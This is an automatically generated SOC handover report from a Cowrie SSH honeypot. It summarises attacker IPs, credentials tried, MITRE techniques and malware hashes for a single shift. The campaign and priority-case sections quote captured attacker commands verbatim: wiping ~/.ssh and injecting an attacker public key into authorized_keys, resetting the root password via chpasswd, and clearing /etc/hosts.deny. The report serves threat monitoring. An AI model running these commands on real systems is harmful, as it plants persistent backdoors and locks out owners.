# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T14:38:57Z |
| **Shift Time** | 14:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **34** |
| Confirmed Threats | **32** |
| False Positives Filtered | **2** (5.9%) |
| Unique Attacker IPs | **7** |
| Countries of Origin | **3** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **31** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **9** |
| Unique Credential Pairs | **9** |
| Unique Usernames | **7** |
| Unique Passwords | **9** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 1 |
| `Accept-Encoding: gzip` | 1 |
| `dev` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 1 |
| `Accept: */*` | 1 |
| `` | 1 |
| `dev09!` | 1 |
| `abc` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 1 |
| `Accept-Encoding: gzip` | `` | 1 |
| `dev` | `dev09!` | 1 |
| `test1` | `abc` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!Qwer1234` | `115.190.106.110` | 2026-04-12T13:53:31 |
| `root` | `qazwsx2020` | `115.190.106.110` | 2026-04-12T13:55:18 |
| `root` | `3245gs5662d34` | `115.190.106.110` | 2026-04-12T13:55:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **34** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 27 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 26 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 26 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:M4nOX0HoONcH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `115.190.106.110`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `115.190.106.110`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **7** |
| Unique ASNs | **7** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS134765` | CHINANET Yunnan province IDC1 network | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-f911a9b789d9

| Field | Detail |
|---|---|
| **Source IP** | `115.190.106[.]110` |
| **First Seen** | 2026-04-12 13:53 |
| **Last Seen** | 2026-04-12 13:53 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:M4nOX0HoONcH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 13:53:29` | `cowrie.session.connect` |
| `2026-04-12 13:53:29` | `cowrie.client.version` |
| `2026-04-12 13:53:30` | `cowrie.client.kex` |
| `2026-04-12 13:53:31` | `cowrie.login.success` |
| `2026-04-12 13:53:31` | `cowrie.session.params` |
| `2026-04-12 13:53:31` | `cowrie.command.input` |
| `2026-04-12 13:53:31` | `cowrie.command.failed` |
| `2026-04-12 13:53:31` | `cowrie.log.closed` |
| `2026-04-12 13:53:32` | `cowrie.session.params` |
| `2026-04-12 13:53:32` | `cowrie.command.input` |
| `2026-04-12 13:53:32` | `cowrie.session.file_download` |
| `2026-04-12 13:53:32` | `cowrie.log.closed` |
| `2026-04-12 13:53:44` | `cowrie.session.params` |
| `2026-04-12 13:53:44` | `cowrie.command.input` |
| `2026-04-12 13:53:44` | `cowrie.log.closed` |
| `2026-04-12 13:53:45` | `cowrie.session.params` |
| `2026-04-12 13:53:45` | `cowrie.command.input` |
| `2026-04-12 13:53:45` | `cowrie.log.closed` |
| `2026-04-12 13:53:46` | `cowrie.session.params` |
| `2026-04-12 13:53:46` | `cowrie.command.input` |
| `2026-04-12 13:53:46` | `cowrie.session.file_download` |
| `2026-04-12 13:53:46` | `cowrie.log.closed` |
| `2026-04-12 13:53:47` | `cowrie.session.params` |
| `2026-04-12 13:53:47` | `cowrie.command.input` |
| `2026-04-12 13:53:47` | `cowrie.log.closed` |
| `2026-04-12 13:53:47` | `cowrie.session.params` |
| `2026-04-12 13:53:47` | `cowrie.command.input` |
| `2026-04-12 13:53:47` | `cowrie.log.closed` |
| `2026-04-12 13:53:48` | `cowrie.session.params` |
| `2026-04-12 13:53:48` | `cowrie.command.input` |
| `2026-04-12 13:53:48` | `cowrie.command.input` |
| `2026-04-12 13:53:48` | `cowrie.log.closed` |
| `2026-04-12 13:53:49` | `cowrie.session.params` |
| `2026-04-12 13:53:49` | `cowrie.command.input` |
| `2026-04-12 13:53:49` | `cowrie.log.closed` |
| `2026-04-12 13:53:49` | `cowrie.session.params` |
| `2026-04-12 13:53:49` | `cowrie.command.input` |
| `2026-04-12 13:53:49` | `cowrie.log.closed` |
| `2026-04-12 13:53:50` | `cowrie.session.params` |
| `2026-04-12 13:53:50` | `cowrie.command.input` |
| `2026-04-12 13:53:50` | `cowrie.log.closed` |
| `2026-04-12 13:53:51` | `cowrie.session.params` |
| `2026-04-12 13:53:51` | `cowrie.command.input` |
| `2026-04-12 13:53:51` | `cowrie.log.closed` |
| `2026-04-12 13:53:52` | `cowrie.session.params` |
| `2026-04-12 13:53:52` | `cowrie.command.input` |
| `2026-04-12 13:53:52` | `cowrie.log.closed` |
| `2026-04-12 13:53:52` | `cowrie.session.params` |
| `2026-04-12 13:53:52` | `cowrie.command.input` |
| `2026-04-12 13:53:52` | `cowrie.log.closed` |
| `2026-04-12 13:53:53` | `cowrie.session.params` |
| `2026-04-12 13:53:53` | `cowrie.command.input` |
| `2026-04-12 13:53:53` | `cowrie.log.closed` |
| `2026-04-12 13:53:54` | `cowrie.session.params` |
| `2026-04-12 13:53:54` | `cowrie.command.input` |
| `2026-04-12 13:53:54` | `cowrie.log.closed` |
| `2026-04-12 13:53:54` | `cowrie.session.params` |
| `2026-04-12 13:53:54` | `cowrie.command.input` |
| `2026-04-12 13:53:55` | `cowrie.log.closed` |
| `2026-04-12 13:53:55` | `cowrie.session.params` |
| `2026-04-12 13:53:55` | `cowrie.command.input` |
| `2026-04-12 13:53:56` | `cowrie.log.closed` |
| `2026-04-12 13:53:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.106[.]110` to AbuseIPDB if not already reported
- [ ] Block `115.190.106[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f2d3401a59

| Field | Detail |
|---|---|
| **Source IP** | `115.190.106[.]110` |
| **First Seen** | 2026-04-12 13:55 |
| **Last Seen** | 2026-04-12 13:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 13:55:18` | `cowrie.session.connect` |
| `2026-04-12 13:55:18` | `cowrie.client.version` |
| `2026-04-12 13:55:18` | `cowrie.client.kex` |
| `2026-04-12 13:55:18` | `cowrie.login.success` |
| `2026-04-12 13:55:19` | `cowrie.session.params` |
| `2026-04-12 13:55:19` | `cowrie.command.input` |
| `2026-04-12 13:55:19` | `cowrie.command.failed` |
| `2026-04-12 13:55:19` | `cowrie.log.closed` |
| `2026-04-12 13:55:19` | `cowrie.session.params` |
| `2026-04-12 13:55:19` | `cowrie.command.input` |
| `2026-04-12 13:55:19` | `cowrie.session.file_download` |
| `2026-04-12 13:55:19` | `cowrie.log.closed` |
| `2026-04-12 13:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.106[.]110` to AbuseIPDB if not already reported
- [ ] Block `115.190.106[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c089d3c83b54

| Field | Detail |
|---|---|
| **Source IP** | `115.190.106[.]110` |
| **First Seen** | 2026-04-12 13:55 |
| **Last Seen** | 2026-04-12 13:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 13:55:26` | `cowrie.session.connect` |
| `2026-04-12 13:55:27` | `cowrie.client.version` |
| `2026-04-12 13:55:30` | `cowrie.client.kex` |
| `2026-04-12 13:55:31` | `cowrie.login.success` |
| `2026-04-12 13:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.106[.]110` to AbuseIPDB if not already reported
- [ ] Block `115.190.106[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.190.106[.]110` | **21** | 2026-04-12 13:47 | 2026-04-12 14:02 | 36m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.218.118[.]203` | **5** | 2026-04-12 13:14 | 2026-04-12 13:27 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-04-12 13:50 | 2026-04-12 13:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]208` | 1 | 2026-04-12 13:49 | 2026-04-12 13:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.97.11[.]71` | 1 | 2026-04-12 13:07 | 2026-04-12 13:08 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `222.97.11[.]71` | KR | Korea Telecom | **100** ⚠️ | 37 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `116.55.245[.]26` | CN | CHINANET YUNNAN PROVINCE NETWORK | **100** ⚠️ | 50 |
| `14.103.115[.]208` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `115.190.106[.]110` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |
| `128.24.160[.]224` | US | Microsoft Limited | **33** | 4 |
| `43.139.124[.]9` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | 22 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 27 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 34 cases |
| Tool 34  | Credential Extractor        | ✅ 9 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 7 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (5.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 7 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 5 recon entry/entries in table (2 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T14:38:57Z_
